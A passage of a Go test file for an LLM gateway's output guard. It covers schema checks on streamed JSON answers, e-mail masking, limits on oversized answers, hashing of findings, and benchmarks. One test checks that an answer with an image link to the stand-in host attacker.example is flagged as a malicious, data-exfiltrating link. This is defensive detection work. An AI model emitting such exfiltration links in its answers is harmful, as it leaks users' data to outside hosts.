	wire, text, _, _ := readStream(t, g.url, streamRequest)
	if text != bad || !strings.HasSuffix(strings.TrimSpace(wire), "data: [DONE]") {
		t.Fatalf("the answer did not arrive whole:\n%q", text)
	}
	withText := 0
	for _, d := range contentDeltas(wire) {
		if d != "" {
			withText++
		}
	}
	if withText < 20 {
		t.Fatalf("%d events carried text: the stream was held", withText)
	}
	e := g.outputEvent(t)
	if e.OutputAction != "PASS" || len(e.OutputFindings) != 1 || e.OutputFindings[0].Category != "schema_mismatch" {
		t.Fatalf("event: action %q, findings %+v", e.OutputAction, e.OutputFindings)
	}
}

// The guard itself, on every way of cutting the text and on both shapes of
// channel end.
func TestStreamGuard_Schema(t *testing.T) {
	pol := mustPolicy(t, schemaPolicy("always", "output_schema"))
	schema, _ := pol.AnswerSchema()
	guard := func(hold bool) *streamGuard {
		g := scanningGuard()
		g.schema = func(text string) (scanner.Finding, bool, error) {
			return judgeDocument(context.Background(), schema, text)
		}
		g.schemaHold, g.schemaMax = hold, 4096
		if hold {
			g.blocks = func(f scanner.Finding) bool { return f.Type == scanner.SchemaFindingType || f.Category == "tc_kimlik" }
		}
		return g
	}
	for size := 1; size <= 45; size += 4 {
		// OpenAI: the channel is closed by an event with no text.
		_, text, stopped := run(t, guard(true), streamOf(goodDoc, size)...)
		if stopped || text != goodDoc {
			t.Fatalf("held, accepted, pieces of %d: stopped=%v text=%q", size, stopped, text)
		}
		g := guard(true)
		wire, text, stopped := run(t, g, streamOf(badDoc, size)...)
		if !stopped || text != "" || g.stopReason != "schema_mismatch" || strings.Contains(wire, "Ankara") {
			t.Fatalf("held, mismatch, pieces of %d: stopped=%v reason=%q text=%q", size, stopped, g.stopReason, text)
		}
		// Anthropic: the block is closed by its own event.
		var events [][]byte
		for _, p := range pieces(badDoc, size) {
			events = append(events, anthropicDelta(0, p))
		}
		events = append(events, anthropicStop(0))
		g = guard(false)
		_, text, stopped = run(t, g, events...)
		if stopped || text != badDoc || len(g.findings) != 1 || g.findings[0].Type != scanner.SchemaFindingType {
			t.Fatalf("recorded, mismatch, pieces of %d: stopped=%v text=%q findings=%+v", size, stopped, text, g.findings)
		}
	}

	// A stream that ends without closing its channel is judged all the same.
	g := guard(true)
	// (run reports a stop only when an event caused it; here the end did.)
	wire, text, stopped := run(t, g, openAIChunk(badDoc[:20]), openAIChunk(badDoc[20:]))
	if stopped || g.stopReason != "schema_mismatch" || text != "" || !strings.Contains(wire, "content_policy_violation") {
		t.Fatalf("no closing event: reason=%q text=%q", g.stopReason, text)
	}

	// A held answer is still scanned: a value in it is masked or blocks.
	withMail := `{"answer": "write to ayse@example.com", "confidence": 0.5}`
	_, text, stopped = run(t, guard(true), streamOf(withMail, 5)...)
	if stopped || text != `{"answer": "write to [email_REDACTED]", "confidence": 0.5}` {
		t.Fatalf("held answer with an address: stopped=%v text=%q", stopped, text)
	}

	// More text than is kept to be judged: withheld, unless fail_open.
	huge := `{"answer": "` + strings.Repeat("a", 6000) + `", "confidence": 0.5}`
	g = guard(true)
	_, text, stopped = run(t, g, streamOf(huge, 500)...)
	if !stopped || text != "" || g.stopReason != "schema_unjudged_too_large" {
		t.Fatalf("too large: stopped=%v reason=%q, %d bytes sent", stopped, g.stopReason, len(text))
	}
	g = guard(true)
	g.failOpen = true
	_, text, stopped = run(t, g, streamOf(huge, 500)...)
	if stopped || text != huge || len(g.findings) != 0 {
		t.Fatalf("too large, fail_open: stopped=%v, %d of %d bytes sent", stopped, len(text), len(huge))
	}
}

// ── hash_findings ────────────────────────────────────────────────────────

// With data.hash_findings on, the event of a masked link holds a digest of
// the host and keeps what describes the detection; a schema mismatch keeps
// the keyword and its place in the schema.
func TestAnswerFindings_AreHashedLikeAnyOther(t *testing.T) {
	hasher, err := store.NewFindingHasher(base64.StdEncoding.EncodeToString(bytes.Repeat([]byte{9}, 32)), "")
	if err != nil {
		t.Fatal(err)
	}
	previous := store.CurrentFindingHasher()
	store.SetFindingHasher(hasher)
	t.Cleanup(func() { store.SetFindingHasher(previous) })

	g := newAnswerRig(t, linkPolicy+"data:\n  hash_findings: true\n", jsonUpstream(openAIAnswer(exfilAnswer)))
	if resp, body := g.post(t, "/v1/chat/completions", chatRequest); resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d: %s", resp.StatusCode, body)
	}
	e := g.outputEvent(t)
	links := ofType(e.OutputFindings, "malicious_link")
	if !e.FindingsHashed || len(links) != 1 {
		t.Fatalf("hashed = %v, findings = %+v", e.FindingsHashed, e.OutputFindings)
	}
	f := links[0]
	if f.Match != hasher.Hash("attacker.example") || strings.Contains(f.Match, "attacker") {
		t.Errorf("match = %q", f.Match)
	}
	if f.Metadata["kind"] != linkscan.KindImage || f.Metadata["chars"] == "" || len(f.Metadata) != 2 {
		t.Errorf("metadata = %v", f.Metadata)
	}

	g = newAnswerRig(t, schemaPolicy("always", "output_schema")+"data:\n  hash_findings: true\n", jsonUpstream(openAIAnswer(badDoc)))
	if resp, _ := g.post(t, "/v1/chat/completions", chatRequest); resp.StatusCode != http.StatusForbidden {
		t.Fatalf("status = %d", resp.StatusCode)
	}
	e = g.outputEvent(t)
	f = e.OutputFindings[0]
	if !e.FindingsHashed || f.Match != "" {
		t.Fatalf("hashed = %v, match = %q", e.FindingsHashed, f.Match)
	}
	if f.Metadata["keyword"] != "maximum" || f.Metadata["schema_path"] != "/properties/confidence/maximum" || f.Metadata["count"] != "1" {
		t.Errorf("metadata = %v", f.Metadata)
	}
}

// ── cost ─────────────────────────────────────────────────────────────────

// BenchmarkAnswerScan is the scan of one buffered answer with and without
// what this file tests, and BenchmarkStreamGuard the guard's work on a
// streamed one.
func BenchmarkAnswerScan(b *testing.B) {
	benign := benchAnswers(b)
	answer := []byte(openAIAnswer(strings.Join(benign[:8], "\n\n")))
	plain := mustBenchPolicy(b, "version: \"1.0\"\noutput_rules:\n  enabled: true\n  redact_on: [email]\n")
	withSchema := mustBenchPolicy(b, schemaPolicy("always", "output_schema"))
	doc := []byte(openAIAnswer(goodDoc))
	reg := testRegistry()
	codeOnly := scanner.NewRegistry()
	codeOnly.Register(scanner.NewCodeLeakScanner())
	withLinks := answerOutputRegistry(func() *policy.Policy { return plain })

	b.Run("links_answer/before", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			_, _ = scanResponseBody(context.Background(), reg, codeOnly, plain, ProviderFor("openai"), answer, 0, scanner.PipelineConfig{})
		}
	})
	b.Run("links_answer/with_link_scanner", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			_, _ = scanResponseBody(context.Background(), reg, withLinks, plain, ProviderFor("openai"), answer, 0, scanner.PipelineConfig{})
		}
	})
	b.Run("json_answer/before", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			_, _ = scanResponseBody(context.Background(), reg, withLinks, plain, ProviderFor("openai"), doc, 0, scanner.PipelineConfig{})
		}
	})
	b.Run("json_answer/with_schema", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			_, _ = scanResponseBody(context.Background(), reg, withLinks, withSchema, ProviderFor("openai"), doc, 0, scanner.PipelineConfig{})
		}
	})
}

func BenchmarkStreamGuard(b *testing.B) {
	benign := benchAnswers(b)
	text := strings.Join(benign[:8], "\n\n")
	events := streamOf(text, 12)
	pol := mustBenchPolicy(b, linkOnlyPolicy)
	reg := testRegistry()
	codeOnly := scanner.NewRegistry()
	codeOnly.Register(scanner.NewCodeLeakScanner())
	withLinks := answerOutputRegistry(func() *policy.Policy { return pol })
	feed := func(b *testing.B, out *scanner.Registry, tokenHold int) {
		b.ReportMetric(float64(len(events)), "events/op")
		for i := 0; i < b.N; i++ {
			g := newStreamGuard()
			g.tokenHold = tokenHold
			g.scan = func(t []byte) ([]scanner.Finding, error) {
				return scanStreamText(context.Background(), reg, out, t, scanner.PipelineConfig{})
			}
			g.redacts = pol.OutputRedacts
			for _, ev := range events {
				if _, stop := g.event(ev); stop {
					b.Fatal("stopped")
				}
			}
			g.finish()
		}
	}
	b.Run("before", func(b *testing.B) { feed(b, codeOnly, 0) })
	b.Run("run_hold", func(b *testing.B) { feed(b, codeOnly, defaultTokenHold) })
	b.Run("run_hold_and_link_scanner", func(b *testing.B) { feed(b, withLinks, defaultTokenHold) })
}

func benchAnswers(b *testing.B) []string {
	b.Helper()
	raw, err := os.ReadFile(filepath.Join("..", "scanner", "linkscan", "testdata", "benign_answers.json"))
	if err != nil {
		b.Fatal(err)
	}
	var benign []string
	if err := json.Unmarshal(raw, &benign); err != nil {
		b.Fatal(err)
	}
	return benign
}

func mustBenchPolicy(b *testing.B, yaml string) *policy.Policy {
	b.Helper()
	p, err := policy.LoadFromBytes([]byte(yaml))
	if err != nil {
		b.Fatal(err)
	}
	return p
}
